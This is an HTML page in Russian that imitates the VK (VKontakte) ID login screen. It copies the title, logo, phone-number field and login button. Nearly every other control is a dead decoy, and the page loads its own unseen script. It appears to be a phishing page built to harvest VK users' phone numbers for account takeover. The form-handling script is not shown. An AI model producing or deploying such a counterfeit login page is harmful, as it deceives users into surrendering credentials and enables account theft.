<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход ВКонтакте</title>
    <link rel="stylesheet" href="/styles.css">
</head>
<body class="vk-bg">
    <div class="vk-bg-lines"></div>
    <div class="vk-center">
        <div class="vk-card">
            <div class="vk-login-box">
                <button class="vk-back-btn" tabindex="-1"><span>&larr;</span></button>
                <div class="vk-logo-center">
                    <img src="/icons/vk.svg" alt="VK" class="vk-logo-img" onerror="this.style.display='none'" />
                </div>
                <h2 class="vk-title">Вход ВКонтакте</h2>
                <div class="vk-tabs">
                    <button class="vk-tab active">Телефон</button>
                    <button class="vk-tab" disabled>Почта</button>
                </div>
                <form id="loginForm">
                    <div class="vk-phone-group">
                        <img src="/icons/ru.svg" alt="RU" class="vk-flag-img" onerror="this.style.display='none'" />
                        <input type="tel" id="phoneNumber" placeholder="+7" required autocomplete="off" />
                    </div>
                    <div class="vk-checkbox-group">
                        <input type="checkbox" id="rememberMe" checked />
                        <label for="rememberMe">Сохранить вход</label>
                    </div>
                    <button type="submit" class="vk-login-btn">Войти</button>
                </form>
                <button class="vk-create-btn" tabindex="-1">Создать аккаунт</button>
                <div class="vk-or">или с помощью</div>
                <button class="vk-qr-btn" tabindex="-1">
                    <img src="/icons/qr.svg" alt="QR" class="vk-qr-icon-img" onerror="this.style.display='none'" /> QR-код
                </button>
                <div class="vk-agreement">
                    Нажимая «Войти», вы принимаете <a href="#" tabindex="-1">пользовательское соглашение</a> и <a href="#" tabindex="-1">политику конфиденциальности</a>
                </div>
            </div>
        </div>
    </div>
    <div class="vk-bottom-link">
        <a href="#" tabindex="-1">Узнать больше о VK ID</a>
    </div>
    <script src="/script.js"></script>
</body>
</html>
